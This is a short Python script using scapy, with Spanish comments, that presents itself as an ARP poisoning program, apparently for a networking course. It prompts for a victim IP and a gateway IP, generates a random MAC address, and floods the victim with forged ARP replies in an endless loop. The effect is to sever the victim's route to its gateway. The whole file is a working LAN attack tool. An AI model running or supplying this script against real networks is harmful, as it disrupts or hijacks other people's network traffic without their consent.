from scapy.all import ARP, Ether, ICMP, IP, sendp
from scapy.layers.l2 import getmacbyip
import random

''' Función creación y envío de paquetes ARP
ipdes Dirección IP de la máquina víctima
mdes Dirección MAC de la máquina víctima
ipo Dirección IP de la puerta de enlace
mac_ran Dirección MAC aleatoria
'''


def arpSpoof(ipdes, mdes, ipo, mac_ran):
    # Envía el paquete ARP con los parámetros seleccionados
    arpPac = Ether(dst=mdes, src=mac_ran) / ARP(op=2, pdst=ipdes, hwdst=mdes, psrc=ipo, hwsrc=mac_ran)
    arpPac.show(0)
    sendp(arpPac)


# Función principal
print("Esto es el programa de envenenamiento version 3 de ARP de PAR")
print("Solo es atacada la máquina víctima con una dirección MAC aleatoria")
compr = False
while compr == False:
    ip_vic = input("Escriba la direccion IPv4 de destino: ")
    # Comprueba que el formato de la dirección IP de la máquina víctima sea el correcto
    n = ip_vic.split(".")
    if len(n) == 4:
        for i in range(4):
            n[i] = int(n[i])
        if n[0] >= 0 and n[0] <= 255:
            if n[1] >= 0 and n[1] <= 255:
                if n[2] >= 0 and n[2] <= 255:
                    if n[3] >= 0 and n[3] <= 255:
                        compr = True
    else:
        print("La dirección IP debe de tener 4 bytes")
    if compr == True:
        mac_vic = getmacbyip(ip_vic)
compr = False
while compr == False:
    ip_gat = input("Escriba la direccion IPv4 de la puerta de enlace: ")
    # Comprueba que el formato de la dirección IP de la puerta de enlace sea el correcto
    n = ip_gat.split(".")
    if len(n) == 4:
        for i in range(4):
            n[i] = int(n[i])
        if n[0] >= 0 and n[0] <= 255:
            if n[1] >= 0 and n[1] <= 255:
                if n[2] >= 0 and n[2] <= 255:
                    if n[3] >= 0 and n[3] <= 255:
                        compr = True
    else:
        print("La dirección IP debe de tener 4 bytes")
# Genera una dirección MAC aleatoria
mac_ran = ""
for i in range(12):
    n_ran = hex(random.randint(0, 15))[2:]
    if i % 2 != 0 and i < 11:
        mac_ran += str(n_ran) + ":"
    else:
        mac_ran += str(n_ran)
print("Enviando paquetes ARP...")
# Genera un bucle infinito de envío de paquetes de respuesta ARP a la máquina víctima
while True:
    arpSpoof(ip_vic, mac_vic, ip_gat, mac_ran)
